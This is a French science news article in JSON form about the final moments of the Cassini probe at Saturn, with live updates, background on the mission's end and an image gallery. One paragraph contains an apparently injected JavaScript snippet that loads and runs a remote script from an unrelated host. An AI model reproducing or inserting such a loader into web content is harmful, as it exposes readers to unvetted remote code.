{"title": "Grand final de Cassini : les derniers moments", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-09-15", "content": "Cassini s'est bien desintegree dans l'atmosphere de Saturne. Fin d'une longue mission autour de la planete aux anneaux et de ses lunes, debutee il y a 13 ans. Decouvrez ses dernieres images. Nicolas Altobelli, le responsable scientifique pour l'ESA de la mission Cassini, nous explique les raisons de ce suicide dans la planete geante. Adieu Cassini et merci ! La mission partie de la  Terre  il y a 20 ans, vient de s'achever officiellement. La sonde spatiale fait desormais partie de  Saturne . Seul reste entier le petit module Huygens, descendu sur  Titan  en janvier 2005. A 13 h 55, heure de Paris, quelque 83 minutes apres que le vaisseau soit entre dans l' atmosphere  de Saturne, le dernier signal emis est arrive sur les ecrans du centre de controle de la Nasa. La destruction est confirmee. La disparition du pic au centre a signe la fin de la mission Cassini. (c) Nasa                               L'heritage de Cassini Cassini nous laisse un heritage immense. Toutes les donnees que la sonde a collectees durant ses 13 annees d'exploration de Saturne et de ses  lunes  sont loin d'avoir ete toutes etudiees. Bien des decouvertes attendent encore les chercheurs en plus de celles, pour beaucoup surprenantes, qui ont deja ete faites.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Jusqu'au bout, Cassini a travaille. Huit instruments fonctionnaient encore jusqu'a sa desintegration. Des donnees inedites attendent les scientifiques de la mission. Encore bravo a toutes les equipes de cette mission qui rappelons-le, a ete imaginee au debut des annees 1980. Pour en savoir plus Derniere image de Saturne avant le grand plongeon Mise a jour le 15 septembre 2017 a 13 h 45  Voici la derniere image de Saturne prise par Cassini. L'image brute a ete traitee. Derniere photo de Cassini. L'image brute a ete traitee par Jason Major. (c) Nasa, JPL-Caltech, SSI, Jason Major                       Voir aussi : Posez vos questions en direct sur notre page Facebook. Cassini a plonge dans Saturne Mise a jour le 15 septembre 2017 a 12 h 51 A 12 h 31, Cassini a plonge dans l'atmosphere de Saturne. La sonde doit etre detruite a present. Le dernier signal emis par Cassini devrait arriver sur Terre vers 13 h 54, heure de Paris, apres un voyage de quelque 83 minutes a la  vitesse  de la lumiere. Revivez le plongeon de Cassini dans Saturne dans cette simulation de la Nasa. (c) Nasa, JPL Voir aussi : Posez vos questions en direct sur notre page Facebook. Position actuelle de Cassini Mise a jour le 15 septembre 2017 a 12 h 08 Position de Cassini au-dessus de Saturne, quelques minutes avant sa destruction. Voici la vue qu'elle avait a ce moment precis. Son antenne est dirigee vers la Terre. Elle a ete reconfiguree pour qu'elle transmette immediatement les donnees recueillies. Celles-ci sont tres precieuses etant donne sa proximite avec l'atmosphere de la planete geante. Il lui reste moins de 77.000 km a parcourir. La vitesse du vaisseau varie entre 104 et 110.000 km/h. Cassini se rapproche de plus en plus de Saturne. (c) Nasa, JPL                               Voir aussi : Posez vos questions en direct sur notre page Facebook. Dernier portrait de Saturne Mise a jour le 15 septembre 2017 a 11 h 43 Portrait de Saturne realise a partir des images brutes de Cassini prises le 13 septembre. La sonde etait alors en route pour son plongeon dans l'atmosphere de la planete geante. En route vers Saturne pour son grand plongeon. Images de Cassini prises le 13 septembre, traitees et assemblees par Jason Major. (c) Nasa, JPL-Caltech, SSI, Jason Major                               Voir aussi : Posez vos questions en direct sur notre page Facebook. Cassini : dernieres images de Titan Article initial publie le 15 septembre a 10 h 25 La grande mission de Cassini va s'achever dans moins de 3 h 30. La sonde qui explore Saturne est ses mondes depuis 13 ans et deux mois est desormais a moins de 180.000 km de la  geante gazeuse , ou elle va se desintegrer, ce vendredi 15 septembre 2017, apres 12 h 30, heure de Paris, a environ 1.900 km au-dessus des sommets des  nuages . On imagine la fierte et l'emotion que doivent ressentir les equipes qui ont participe a cette grande aventure spatiale commencee il y a plus de deux decennies. Une des toutes dernieres images de Titan prise par Cassini. (c) Nasa, JPL-Caltech, SSI                               Parmi les toutes dernieres images que nous envoie le vaisseau qui est sur sa trajectoire suicide,  Titan  a qui il a fait ses adieux le 11 septembre. A venir dans les prochaines heures, les ultimes photos et mesures de Cassini. Dans sa ligne de mire : Saturne. Voir aussi : Posez vos questions en direct sur notre page Facebook. A quoi va servir le plongeon de Cassini dans Saturne ? Article de Remy Decourt publie le 8 septembre 2017 Le plongeon dans Saturne de la sonde Cassini est dangereux pour le vaisseau spatial mais la decision a ete murement reflechie. Nicolas Altobelli, le responsable scientifique pour l'Agence spatiale europeenne de la mission Cassini, nous explique les raisons de ce choix et le retour scientifique attendu.  Le 15 septembre, il en sera termine de Cassini. Ce plongeon dans Saturne a ete  << decide par l' ESA  et la Nasa pour se debarrasser proprement de la sonde de facon a nous conformer aux regles de la protection planetaire >> , nous explique Nicolas Altobelli, le responsable scientifique pour l'ESA de la mission Cassini. Ces regles stipulent de ne pas contaminer d'autres mondes d'une facon qui compromettrait de futures etudes scientifiques sur d'eventuelles traces de vie, actuelles ou eteintes. C'est pourquoi les deux agences spatiales ne veulent pas risquer de perdre le controle de Cassini qui risquerait de s'ecraser sur la  surface d'Encelade  ou celle de  Titan ,  << deux lunes dotees d'une habitabilite potentielle >> . Et ce risque est bien reel. De facon surprenante, les sondes spatiales n'ont pas de jauge pour mesurer la quantite de carburant restante. Le niveau des reservoirs est toujours estime a partir de calculs et les operateurs au sol ne le connaissent jamais precisement. Le defi est donc de terminer la mission avant que le risque d'une panne seche ne devienne trop important. Vue d'artiste de la sonde Cassini lors de son entree dans l'atmosphere de Saturne a 3.000 kilometres de la surface de reference, ou regne une pression de 1 bar. (c) Nasa, JPL                               Cassini devrait emettre durant une minute pendant son plongeon Cette fin de mission qui se terminera par un  plongeon dans Saturne , les responsables  << la preparent depuis plusieurs mois >> . Jusqu'aux derniers instants de la sonde,  << les  orbites  ont ete optimisees pour garantir un retour scientifique important >> . Lors de sa toute derniere orbite, Cassini pointera son antenne vers la Terre pour envoyer ses donnees  << lorsqu'elle entrera dans l'atmosphere et durant sa descente >> . Le dernier  survol de Titan  (le 127 e  !), a plus de 100.000 kilometres, doit permettre aux controleurs au sol de mesurer assez precisement la  duree  de la communication avec la Terre des que la sonde aura debute son plongeon final. Le point d'entree de Cassini dans l'atmosphere se situe a 3.000 kilometres d'altitude au-dessus d'une surface de reference, arbitrairement choisie, ou la  pression atmospherique  est d'un  bar  (celle qui regne sur Terre au niveau de la mer).  << Ce bar de pression est la surface de reference pour une  planete gazeuse . >>  D'apres les derniers calculs, la Nasa et l'ESA s'attendent a recevoir des donnees pendant  << au moins une minute >>  et pensent que Cassini descendra jusqu'a environ 1.500 kilometres au-dessus de cette surface de reference avant que le signal ne soit perdu. A ce moment-la, la camera ne fonctionnera plus, elle aura acquis ses dernieres images quelques heures auparavant. Seuls le  magnetometre  et les analyseurs de  gaz , de  plasma  et de micro-meteorites fonctionneront, pour mesurer  << le  champ magnetique  de la planete >>  et renseigner sur  << la composition des couches atmospheriques traversees >> . Apres cette derniere  emission  de donnees, le pointage de l'antenne grand gain vers la Terre sera rapidement perdu. A cause de sa vitesse, 35 kilometres par seconde, et du frottement de l'atmosphere sur la structure de l'engin spatial (pas du tout aerodynamique),  << la sonde va tres vite se destabiliser puis finira par se desintegrer dans l'atmosphere >> . Grand final de Cassini : les 5 derniers tours de la sonde autour de Saturne Article de  Jean-Luc Goudet  publie le 15/08/2017 Lundi prochain, la sonde Cassini va entamer une serie de cinq orbites rapprochees, les dernieres avant le grand plongeon final du 15 septembre qui la verra disparaitre au coeur de Saturne. En s'approchant tres pres de la haute atmosphere et des nuages, elle va l'observer comme elle ne l'avait encore jamais fait. L'engin spatial, qui a quitte la Terre en 1997, utilise son carburant jusqu'a la derniere  goutte  pour travailler... Le dernier chapitre du <<  Grand final  >>, derniere phase de la longue  mission Cassini-Huygens , debutee en avril, s'ouvre ce week-end avec la premiere des cinq dernieres orbites rapprochees autour de Saturne. Lundi 14 aout, a 18 h 22 heure de Paris, la sonde de la Nasa, inscrite sur une trajectoire elliptique, passera a seulement 5.990 km du bord interne de l'anneau et survolera les plus hauts nuages de la geante gazeuse, a une hauteur comprise entre 1.630 et 1.710 km. A cette faible distance, l'atmosphere est tres tenue, mais presente. L'engin spatial devra allumer ses  propulseurs  pour maintenir sa route. Il lui reste encore un peu de  propergol  (de l' hydrazine ), ce qui permet ces ultimes survols avant le plongeon final dans  Saturne , le 15 septembre prochain. La sonde Cassini va froler Saturne avant son suicide Cassini au plus pres de l'atmosphere de Saturne Durant ce  Grand final , troisieme extension de la mission commencee autour de Saturne en 2004, Cassini poursuit ses observations. Pour les scientifiques, c'est un bonus : il n'etait nullement certain, au lancement de la sonde en 1997, qu'elle travaille jusqu'en 2017. Elle est meme en pleine possession de ses moyens. Le sous-systeme d'imagerie ( ISS , pour  Imaging Science Subsystem ) va scruter dans l'anneau D de curieux << traits >>, comme ceux deja observes et resultant de l'impact de petits  asteroides . La haute atmosphere sera l'objet d'attentions particulieres. Le  spectrometre  infrarouge (CIRS,  Composite Infrared Spectrometer ) mesurera les temperatures et du gaz sera preleve. Le spectrometre de  masse  INMS ( Ion  and Neutral Mass Spectrometer ) l'analysera, comme il l'avait fait pour les  panaches d'Encelade , tandis que, simultanement, le radar, en mode passif, observera l'atmosphere, notamment pour y reperer des concentrations d' ammoniac . Photos : Les plus belles images du monde de Saturne vu par Cassini Saturne a l'approche de l'ete                                       L'hemisphere nord de Saturne le 25 avril 2016, a l'approche du solstice d'ete pour le << seigneur des anneaux >> en mai 2017 (l'annee de Saturne dure 29 annees terrestres). Au cours de ses 13 annees d'exploration, la sonde Cassini a pu voir la planete geante passer de l'hiver au printemps, dans l'hemisphere nord et de l'ete a l'automne, dans l'hemisphere sud. (c) Nasa, JPL-Caltech, Space Science Institute                                                                       Saturne et ses anneaux, portrait rapproche                                       Le 19 janvier 2007, l'orbite de Cassini l'a eloignee de Saturne. De ce lointain poste d'observation, la sonde, arrivee depuis pres de deux ans et demi, prend un cliche de la planete aux anneaux devenu celebre. (c) Nasa, JPL, Space Science Institute                                                                       La Terre, Venus et Mars vues de Saturne                                       Le 19 juillet 2013, la sonde spatiale Cassini profita d'un passage dans l'ombre de Saturne pour photographier a contre-jour les anneaux, quelques satellites naturels, Mars, Venus et la Terre. Notre planete apparait comme un << pale petit point bleu >> selon l'expression de l'astronome Carl Sagan. Il faisait jour et beau en Europe ce jour-la : vous etes sur la photo. (c) Nasa, JPL-Caltech, SSI                                                                       Le grand panorama des anneaux de Saturne                                       Saturne doit principalement sa renommee et sa beaute a ses anneaux de glace. Innombrables, ils se distinguent en cinq principaux groupes separes par des vides plus ou moins importants. Cette image mosaique en couleur naturelle fut prise par Cassini le 26 novembre a une distance de 1,1 million de km. La composition embrasse les anneaux sur une largeur de 65.700 km. (c) Nasa, JPL, Space Science Institute                                                                       Dans les anneaux de Saturne, l'helice Bleriot                                       Des structures evoquant une helice bipale, invisibles depuis la Terre, ont ete observees au sein des anneaux. Ici, l'une des plus celebres, baptisee Bleriot, en l'honneur de l'aviateur francais connu pour avoir reussi la premiere traversee de la Manche en avion en 1909. Ce sont des perturbations parmi les minuscules particules formant les anneaux, comme des vagues. Plus ou moins stables, elles mesurent plusieurs centaines de kilometres. En leur centre doit se trouver un tout petit satellite, dont la dimension doit etre comprise entre 1 et 2 km, invisible sur la photographie. (c) Nasa, JPL-Caltech, SSI                                                                       Gros plan sur les anneaux de Saturne                                       Voici une partie des anneaux de Saturne, situes entre 98.600 et 105.500 km de la geante gazeuse, dans le groupe de l'anneau B. Ils sont composes d'une multitude de particules (notamment de glace d'eau) de petite taille. Leur densite est variable. (c) Nasa, JPL, Space Science Institute                                                                       D'etranges frises sur le bord des anneaux                                       A l'approche de l'equinoxe en 2009, l'eclairage solaire devoile des structures insoupconnees en marge de l'anneau B. Les reliefs s'elevent jusqu'a 2,5 km au-dessus du plan des anneaux. Il est probable que de minuscules lunes circulant entre les anneaux A et B en perturbent regulierement les bordures. (c) Nasa, JPL, Space Science Institute                                                                       Au-dessus de Saturne                                       Magnifique portrait de Saturne, deuxieme plus grosse planete du Systeme solaire, photographiee le 10 octobre 2013 lors d'un survol polaire de la sonde Cassini. L'image mosaique fut retravaillee par un grand fan de la mission et astronome amateur, Gordan Ugarkovic. On distingue le grand hexagone qui occupe le pole nord. La region est eclairee (c'est alors le printemps dans l'hemisphere nord). Cote anneaux, on peut observer les principales separations : la division de Cassini, de Hencke, Maxwell et Colombo. (c) Nasa, JPL, Space Science Institute, Gordan Ugarkovic                                                                       Le celebre hexagone du pole nord de Saturne                                       Premiere vue complete de l'immense structure avec six faces de courants-jets presente au pole nord de Saturne. Surnommee l'<< hexagone >>, elle s'etend jusqu'a 70deg de latitude. L'equinoxe de printemps dans l'hemisphere nord, qui a debute en 2009, permet au pole nord de la planete geante d'etre enfin expose au Soleil. Ces images en fausses couleurs ont ete capturees par la sonde spatiale Cassini. (c) Nasa, JPL-Caltech, SSI, Universite de Hampton.                                                                       Gros plan sur l'hexagone du pole nord de Saturne                                       Gros plan sur le pole nord de Saturne. L'image a ete prise par Cassini le 8 septembre 2017. La grande structure hexagonale s'etend jusqu'a 70deg de latitude et ses cotes mesurent environ 13.800 km. Sa periode de rotation est de pres de 10 h 40. Le pole sud, quant a lui, ne presente pas de systeme hexagonal. (c) Nasa,JPL-Caltech, SSI, Kevin M. Gill                                                                       Une tempete geante sur Saturne                                       Trois mois apres son apparition remarquee dans l'hemisphere nord de Saturne en decembre 2010, la tempete provoquee par les changements de saison poursuivait son expansion dans la haute atmosphere. Cassini l'a observee jusqu'en 2011. Depuis la Terre, une tempete semblable avait ete observee il y a trente ans, c'est-a-dire une annee saturnienne. (c) Nasa, JPL, Space Science Institute                                                                       Les geysers d'Encelade                                       Courant 2005, les scientifiques remarquent la presence de geysers sur le limbe du petit satellite naturel Encelade (environ 500 km). Les analyses ulterieures montreront qu'il s'agit de particules de glace. Surgit alors l'hypothese qu'il existe un ocean d'eau liquide sous sa surface gelee. (c) Nasa, JPL, Space Science Institute                                                                       Premier survol de Titan par la sonde Cassini                                       Arrivee le 30 juin 2004, la sonde Cassini entreprit son premier survol de Titan le 26 octobre de la meme annee. Sur cette image mosaique retravaillee pour reduire les effets de l'atmosphere, on distingue a droite, une region brillante nommee Xanadu. Les scientifiques n'avaient pas encore caracterise les etendues de methane liquide. (c) Nasa, JPL, Space Science Institute                                                                       Premiere image de la surface de Titan                                       Developpee par l'Agence spatiale europeenne (Esa), la sonde Huygens qui a voyage jusqu'a Saturne en compagnie de Cassini, toucha le sol de la lune Titan le 14 janvier 2005, apres une descente de pres de 2 h 30 afin d'etudier son atmosphere. Photographies a une distance d'environ 85 cm, les blocs visibles au premier plan sont davantage des galets que des rochers. Leurs rondeurs a suggere aux scientifiques une erosion. (c) Nasa, Esa, JPL, Universite de l'Arizona                                                                       Encelade, une lune potentiellement habitable                                       Parmi les grandes decouvertes de Cassini figurent les geysers d'Encelade (500 km de diametre). Depuis 2005, les observations et les mesures de la sonde ont permis aux chercheurs de supposer que la petite lune abrite un vaste ocean d'eau liquide sous sa surface de glace qui, comme on peut le voir, se fissure. (c) Nasa, JPL-Caltech, Space Science Institute                                                                       Encelade et ses geysers                                       Sur cette image capturee par Cassini le 13 octobre 2009, on peut voir une partie d'Encelade directement illuminee par le Soleil et une autre eclairee par la lumiere du Soleil reflechie par Saturne. Jaillissant du pole sud de cette lune glacee, des geysers d'eau. (c) Nasa, JPL, Space Science Institute                                                                       Les deux plus grandes lunes de Saturne                                       Les deux plus grandes lunes de Saturne alignees : au premier plan, Rhea (1.528 km) et, a l'arriere-plan, Titan (5.150 km). Le 16 juin 2011, Cassini etait alors a 1,8 million de km de la premiere et a 2,5 millions de km de la seconde. Les deux lunes arborent deux surfaces tres differentes. (c) Nasa, JPL-Caltech, Space Science Institute                                                                       Japet, une terre de contraste                                       Images composite des deux hemispheres de Japet capturees par Cassini respectivement en 2004 et 2007. Cette petite lune de Saturne de 1.471 km de diametre arbore a sa surface une indeniable dichotomie : des terrains aussi sombres que le charbon (environ 40 % de sa surface) contrastant avec d'autres aussi clairs que la neige. Le grand bassin d'impact Engelier (vue de droite, en bas) mesure 504 km de diametre. (c) Nasa, JPL, Space Science Institute                                                                       L'ombre de Mimas sur les anneaux de Saturne                                       Cette image a ete prise par Cassini le 8 avril 2009 a 1,1 million de km de distance. La petite lune Mimas (396 km) qui gravite autour de Saturne dans le << vide >> de la fameuse division de Cassini, projette son ombre sur les anneaux autour d'elle. La scene a pu etre possible en raison de l'equinoxe d'aout 2009 (ils se deroulent tous les 15 ans) qui approchait. (c) Nasa, JPL, Space Science Institute                                                                       Pan, une soucoupe volante autour de Saturne                                       Deux vues du curieux Pan, un satellite qui tourne pres de Saturne (a moins de 134.000 km du centre de la planete), au milieu de la division Encke de l'anneau A. Ce petit corps de 35 km de diametre maximal pour 23 km de hauteur est forme de particules glacees, les memes que celles formant l'anneau ou il se trouve, et qu'il accumule a son equateur, ce qui lui donne cette allure de soucoupe volante. (c) Nasa, JPL, Space Science Institute                                                                       La petite Peggy deviendra-t-elle une lune ?                                       Sur cette image saisie par Cassini le 15 avril 2013, on distingue sur le bord de l'anneau A la possible formation d'une petite lune que les astronomes ont surnommee Peggy. (c) Nasa, JPL-Caltech, Space Science Institute                                                                       Daphnis fait des vagues dans les anneaux de Saturne                                       Bien que minuscule -- 8 km de longueur --, Daphnis a une force d'attraction suffisante pour perturber les petits grains qui composent les anneaux au milieu desquels elle se fraie un chemin. La petite lune se balade dans l'espace de Keeler, a l'interieur de l'anneau A de Saturne. (c) Nasa, JPL-Caltech, Space Science Institute                                                                       ", "theme": "sciences"}